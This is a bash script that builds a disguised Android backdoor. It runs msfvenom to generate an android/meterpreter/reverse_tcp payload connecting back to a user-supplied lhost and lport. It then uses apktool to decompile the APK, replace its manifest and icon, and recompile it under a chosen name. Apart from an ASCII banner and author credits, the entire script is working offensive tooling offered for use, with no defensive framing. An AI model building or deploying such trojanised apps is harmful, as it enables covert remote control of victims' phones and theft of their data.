#Author - kinghacker0
#Credit - Give me credit if you use any part of my code
clear
#Banner
echo -e "\e[33m                                        \e[0m"
echo -e "\e[33m    :::     ::::    ::: :::   :::            :::     :::::::::  :::    ::: \e[0m";
echo -e "\e[33m  :+: :+:   :+:+:   :+: :+:   :+:          :+: :+:   :+:    :+: :+:   :+:  \e[0m";
echo -e "\e[33m +:+   +:+  :+:+:+  +:+  +:+ +:+          +:+   +:+  +:+    +:+ +:+  +:+  \e[0m";
echo -e "\e[33m+#++:++#++: +#+ +:+ +#+   +#++:  :++#++: +#++:++#++: +#++:++#+  +#++:++   \e[0m";
echo -e "\e[33m+#+     +#+ +#+  +#+#+#    +#+           +#+     +#+ +#+        +#+  +#+  \e[0m";
echo -e "\e[33m#+#     #+# #+#   #+#+#    #+#           #+#     #+# #+#        #+#   #+#  \e[0m";
echo -e "\e[33m###     ### ###    ####    ###           ###     ### ###        ###    ### \e[0m";
echo -e "\e[33m                      [Coded By  :- @kinghacker0]                                        \e[0m"
echo -e "\e[33m                  [Github ID :- github.com/kinghacker0                               \e[0m"

echo -e "\e[55m                                 \e[1m"
read -p "[-]Enter Name Of Output Payload#~ :" backdoor
read -p "[-]Enter lhost#~ :" lhost
read -p "[-]Enter lport#~ :" lport
echo -e "\e[55m                                 \e[1m"
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> backdoor.apk
#decompile
apktool d backdoor.apk
cd backdoor/res && mkdir drawable
cd .. && rm AndroidManifest.xml
cd .. && cp AndroidManifest.xml backdoor
cp icon.png backdoor/res/drawable

#Recompiling
apktool b backdoor
cd backdoor && cd dist
mv backdoor.apk ..
cd .. && mv backdoor.apk ..
cd .. && rm -rf backdoor

#Signing the apk
echo -e "\e[96m                                 \e[2m"

mv backdoor.apk $backdoor.apk

echo
echo -e $Y"I Recommend You To Sign It With Apk-Editor Apk"
